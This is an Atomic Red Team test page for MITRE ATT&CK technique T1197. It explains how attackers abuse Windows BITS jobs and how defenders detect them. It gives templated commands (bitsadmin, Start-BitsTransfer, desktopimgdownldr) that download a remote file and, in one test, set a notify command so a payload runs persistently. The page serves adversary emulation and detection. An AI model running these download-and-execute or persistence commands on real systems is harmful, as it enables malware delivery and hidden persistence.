# T1197 - BITS Jobs
Adversaries may abuse BITS jobs to persistently execute or clean up after malicious payloads. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM). (Citation: Microsoft COM) (Citation: Microsoft BITS) BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.

The interface to create and manage BITS jobs is accessible through [PowerShell](https://attack.mitre.org/techniques/T1059/001)  (Citation: Microsoft BITS) and the [BITSAdmin](https://attack.mitre.org/software/S0190) tool. (Citation: Microsoft BITSAdmin)

Adversaries may abuse BITS to download, execute, and even clean up after running malicious code. BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls. (Citation: CTU BITS Malware June 2016) (Citation: Mondok Windows PiggyBack BITS May 2007) (Citation: Symantec BITS May 2007) BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots). (Citation: PaloAlto UBoatRAT Nov 2017) (Citation: CTU BITS Malware June 2016)

BITS upload functionalities can also be used to perform [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048). (Citation: CTU BITS Malware June 2016)

## Atomic Tests

#Import the Module before running the tests.
Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force

### Atomic Test #1 - Bitsadmin Download (cmd)
This test simulates an adversary leveraging bitsadmin.exe to download
and execute a payload

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
bitsadmin.exe /transfer /Download /priority Foreground #{remote_file} #{local_file}
```

Invoke-AtomicTest T1197 -TestNumbers 1

### Atomic Test #2 - Bitsadmin Download (PowerShell)
This test simulates an adversary leveraging bitsadmin.exe to download
and execute a payload leveraging PowerShell

Upon execution you will find a github markdown file downloaded to the Temp directory

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination #{local_file}
```

Invoke-AtomicTest T1197 -TestNumbers 2

### Atomic Test #3 - Persist, Download, & Execute
This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transfer
and execute a payload in multiple steps. This job will remain in the BITS queue for 90 days by default if not removed.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
bitsadmin.exe /create #{bits_job_name}
bitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}
bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} ""
bitsadmin.exe /resume #{bits_job_name}
timeout 5
bitsadmin.exe /complete #{bits_job_name}
```

Invoke-AtomicTest T1197 -TestNumbers 3

### Atomic Test #4 - Bits download using destktopimgdownldr.exe (cmd)
This test simulates using destopimgdwnldr.exe to download a malicious file
instead of a desktop or lockscreen background img. The process that actually makes 
the TCP connection and creates the file on the disk is a svchost process (“-k netsvc -p -s BITS”) 
and not desktopimgdownldr.exe. See https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
set "#{download_path}" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventName:desktopimgdownldr
```

Invoke-AtomicTest T1197 -TestNumbers 4

## Detection
BITS runs as a service and its status can be checked with the Sc query utility (<code>sc query bits</code>). (Citation: Microsoft Issues with BITS July 2011) Active BITS tasks can be enumerated using the [BITSAdmin](https://attack.mitre.org/software/S0190) tool (<code>bitsadmin /list /allusers /verbose</code>). (Citation: Microsoft BITS)

Monitor usage of the [BITSAdmin](https://attack.mitre.org/software/S0190) tool (especially the ‘Transfer’, 'Create', 'AddFile', 'SetNotifyFlags', 'SetNotifyCmdLine', 'SetMinRetryDelay', 'SetCustomHeaders', and 'Resume' command options)  (Citation: Microsoft BITS)Admin and the Windows Event log for BITS activity. Also consider investigating more detailed information about jobs by parsing the BITS job database. (Citation: CTU BITS Malware June 2016)

Monitor and analyze network activity generated by BITS. BITS jobs use HTTP(S) and SMB for remote connections and are tethered to the creating user and will only function when that user is logged on (this rule applies even if a user attaches the job to a service account). (Citation: Microsoft BITS)